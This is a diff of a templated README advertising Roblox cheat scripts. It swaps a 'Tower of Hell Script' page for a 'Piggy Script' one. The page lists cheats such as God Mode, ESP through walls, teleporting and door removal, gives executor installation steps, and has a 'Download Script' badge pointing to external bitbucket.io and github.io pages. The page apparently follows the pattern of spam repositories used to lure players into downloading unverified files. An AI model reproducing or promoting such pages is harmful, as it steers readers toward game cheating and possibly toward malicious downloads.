@@ -1,50 +1,56 @@
-# 🗼 Tower of Hell Script: Elevate Your Obby Experience 🎮
+# 🐷 Piggy Script: Elevate Your Gameplay Experience 🎮
 
 ## 🌟 Article Description
 
-Dive into the world of Tower of Hell with a script that offers automation, enhanced controls, and streamlined gameplay.
+Dive into the world of Piggy with a script that offers automation, enhanced visuals, and streamlined gameplay.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://Piggy-Script-cipy.github.io/.github)
 ---
 
 ## 🧪 Product Description
 
-The Tower of Hell Script is designed to augment your gaming experience by introducing features that automate tasks, provide enhanced movement capabilities, and offer additional functionalities to streamline gameplay.
+The Piggy Script is designed to augment your gaming experience by introducing features that automate tasks, provide enhanced visual cues, and offer additional functionalities to streamline gameplay.
 
 ---
 
 ## 🔧 Features
 
-* **Auto Farm**: Automatically completes levels without manual effort. 
+* **Auto Farm**: Automatically collects items and completes tasks.
 
-* **God Mode**: Become invincible to obstacles and hazards.
+* **ESP (Extra Sensory Perception)**: Highlights players and items through walls for better awareness.
 
-* **Teleportation**: Instantly move to the end of the tower or specific sections.
+* **Teleportation**: Instantly move to various locations within the game.
 
-* **Infinite Jump**: Jump infinitely to reach high platforms easily. 
+* **God Mode**: Become invincible to attacks.
+
+* **Fly**: Navigate the map effortlessly by flying. 
 
 * **Walkspeed & Jump Power**: Customize your movement speed and jump height.
 
-* **No Clip**: Pass through walls and obstacles effortlessly. 
+* **Auto Use Items**: Automatically uses items when needed.
 
-* **Give All Tools**: Access all in-game tools instantly. 
+* **Bypass Traps**: Avoid traps set by Piggy. 
 
-* **Anti-AFK**: Prevents automatic disconnection due to inactivity.
+* **Remove Doors**: Eliminate doors to access areas quickly.
+
+* **Auto Escape**: Automatically completes the escape sequence.
 
 ---
 
 ## 🔍 Comparisons with Other Scripts
 
-| Feature                | Tower of Hell Script | Other Scripts |                                                                         |
-| ---------------------- | -------------------- | ------------- | ----------------------------------------------------------------------- |
-| Auto Farm              | ✅                    | ✅             |                                                                         |
-| God Mode               | ✅                    | ❌             |                                                                         |
-| Teleportation          | ✅                    | ✅             |                                                                         |
-| Infinite Jump          | ✅                    | ❌             |                                                                         |
-| Walkspeed & Jump Power | ✅                    | ❌             |                                                                         |
-| No Clip                | ✅                    | ❌             |                                                                         |
-| Give All Tools         | ✅                    | ❌             |                                                                         |
-| Anti-AFK               | ✅                    | ❌             |   |
+| Feature                | Piggy Script | Other Scripts |                                                                                      |
+| ---------------------- | ------------ | ------------- | ------------------------------------------------------------------------------------ |
+| Auto Farm              | ✅            | ✅             |                                                                                      |
+| ESP                    | ✅            | ✅             |                                                                                      |
+| Teleportation          | ✅            | ✅             |                                                                                      |
+| God Mode               | ✅            | ❌             |                                                                                      |
+| Fly                    | ✅            | ❌             |                                                                                      |
+| Walkspeed & Jump Power | ✅            | ❌             |                                                                                      |
+| Auto Use Items         | ✅            | ❌             |                                                                                      |
+| Bypass Traps           | ✅            | ❌             |                                                                                      |
+| Remove Doors           | ✅            | ❌             |                                                                                      |
+| Auto Escape            | ✅            | ❌             |   |
 
 This script offers a comprehensive suite of features that surpass many other scripts available.
 
@@ -62,9 +68,9 @@ This script offers a comprehensive suite of features that surpass many other scr
 
 ## 🛠️ Installation Instructions
 
-1. Open Roblox and launch Tower of Hell.
+1. Open Roblox and launch Piggy.
 
-2. Open your preferred script executor. 
+2. Open your preferred script executor.
 
 3. Copy the script code provided.
 
@@ -76,4 +82,4 @@ This script offers a comprehensive suite of features that surpass many other scr
 
 ## 🧠 Conclusion
 
-The Tower of Hell Script is an essential tool for players looking to optimize their gameplay. With its extensive features and ease of use, it provides a significant advantage in the game. Whether you're farming, navigating obstacles, or customizing your experience, this script has you covered.
+The Piggy Script is an essential tool for players looking to optimize their gameplay. With its extensive features and ease of use, it provides a significant advantage in the game. Whether you're farming, completing quests, or escaping Piggy, this script has you covered.
